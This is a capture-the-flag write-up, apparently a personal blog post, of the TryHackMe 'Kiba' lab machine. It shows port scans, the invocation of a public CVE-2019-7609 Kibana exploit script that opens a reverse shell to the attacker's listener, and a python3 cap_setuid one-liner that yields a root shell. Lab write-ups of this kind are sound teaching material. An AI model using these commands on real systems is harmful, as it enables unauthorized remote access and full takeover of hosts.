---
layout: post
title: Kiba Writeup
date: 2020-09-01 00:00:00 +5:30
categories: [TryHackMe, Easy]
tags: [tryhackme, anonymous-ftp, gtfobins] # add tag
---

## Description:

The Following Post is writeup of Kiba room of tryhackme <https://tryhackme.com/room/kiba>

|Machine|Details
|:---|:--
|OS | Linux
|Rating | Easy
|Creator | stuxnet

## Summary

  The Room have 3 open ports 22,80 and 5601. We can notice an open kibana instance in 5601. Now on searching about
  the version of kibana we got if have rce. Exploiting the rce and get a reverse shell. For PrivEsc it have a
  setuid capability running that will spawn a root shell.

## Walkthrough

### Enumeration

Let's start with nmap scan.

```bash
 ─[argenestel@parrot]─[~/Desktop/kiba]
└──╼ $nmap -sC -sV -oA nmap/kiba -v 10.10.166.67
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-29 14:42 IST
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 14:42
Completed NSE at 14:42, 0.00s elapsed
Initiating NSE at 14:42
Completed NSE at 14:42, 0.00s elapsed
Initiating NSE at 14:42
Completed NSE at 14:42, 0.00s elapsed
Initiating Ping Scan at 14:42
Scanning 10.10.166.67 [2 ports]
Completed Ping Scan at 14:42, 0.43s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 14:42
Completed Parallel DNS resolution of 1 host. at 14:42, 0.02s elapsed
Initiating Connect Scan at 14:42
Scanning 10.10.166.67 [1000 ports]
Discovered open port 22/tcp on 10.10.166.67
Discovered open port 80/tcp on 10.10.166.67
Increasing send delay for 10.10.166.67 from 0 to 5 due to 65 out of 216 dropped probes since last increase.
Increasing send delay for 10.10.166.67 from 5 to 10 due to max_successful_tryno increase to 4
Increasing send delay for 10.10.166.67 from 10 to 20 due to max_successful_tryno increase to 5
Increasing send delay for 10.10.166.67 from 20 to 40 due to max_successful_tryno increase to 6
Completed Connect Scan at 14:43, 42.87s elapsed (1000 total ports)
Initiating Service scan at 14:43
Scanning 2 services on 10.10.166.67
Completed Service scan at 14:43, 6.79s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.166.67.
Initiating NSE at 14:43
Completed NSE at 14:43, 8.85s elapsed
Initiating NSE at 14:43
Completed NSE at 14:43, 1.25s elapsed
Initiating NSE at 14:43
Completed NSE at 14:43, 0.00s elapsed
Nmap scan report for 10.10.166.67
Host is up (0.30s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 9d:f8:d1:57:13:24:81:b6:18:5d:04:8e:d2:38:4f:90 (RSA)
|   256 e1:e6:7a:a1:a1:1c:be:03:d2:4e:27:1b:0d:0a:ec:b1 (ECDSA)
|_  256 2a:ba:e5:c5:fb:51:38:17:45:e7:b1:54:ca:a1:a3:fc (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
ah that's 1000 port let's see masscan

```bash
┌─[✗]─[argenestel@parrot]─[~/Desktop/argenestel.github.io]
└──╼ $sudo masscan -i tun0 -p0-10000 10.10.34.204

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-09-01 21:34:21 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [10001 ports/host]
Discovered open port 5601/tcp on 10.10.34.204                                  
Discovered open port 80/tcp on 10.10.34.204                                    
Discovered open port 22/tcp on 10.10.34.204
```

Let's start with kibana.
#### kibana

![kibana](/assets/img/kiba/openkibana.png)

We can see an open kibana instance.<br />
The version is 5.4.1 might be old let's see for any exploits.

![timelion](/assets/img/kiba/kibanatimelion.png)

There is a remote code execution in kibana at timelion function we can search about it.

<https://www.tenable.com/blog/cve-2019-7609-exploit-script-available-for-kibana-remote-code-execution-vulnerability>

### Exploitation

<https://github.com/LandGrey/CVE-2019-7609/>

```bash
└──╼ $./CVE-2019-7609-kibana-rce.py -u http://10.10.166.67:5601 -host 10.9.124.57 -port 4444 --shell
[+] http://10.10.166.67:5601 maybe exists CVE-2019-7609 (kibana < 6.6.1 RCE) vulnerability
[+] reverse shell completely! please check session on: 10.9.124.57:4444

and

┌─[argenestel@parrot]─[~/Downloads]
└──╼ $pwncat --listen --port 4444
[15:55:23] received connection from 10.10.166.67:39932                                                                  connect.py:148
[15:55:26] new host w/ hash be486dbcf9a5edbfffd09b3f51163d7b                                                             victim.py:329
[15:55:43] pwncat running in /bin/bash                                                                                   victim.py:362
[15:55:52] pwncat is ready 🐈                                                                                            victim.py:772


(remote) kiba@ubuntu:/$
```

gotcha

### PrivEsc

```bash

[+] Capabilities
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
Current capabilities:
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
Shell capabilities:
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
Files with capabilities:
/home/kiba/.hackmeplease/python3 = cap_setuid+ep
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep

so we got root


(remote) kiba@ubuntu:/tmp$ /home/kiba/.hackmeplease/python3 -c 'import os; os.setuid(0); os.system("/bin/bash");'
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@ubuntu:/tmp#
```

Rooted Kiba :)
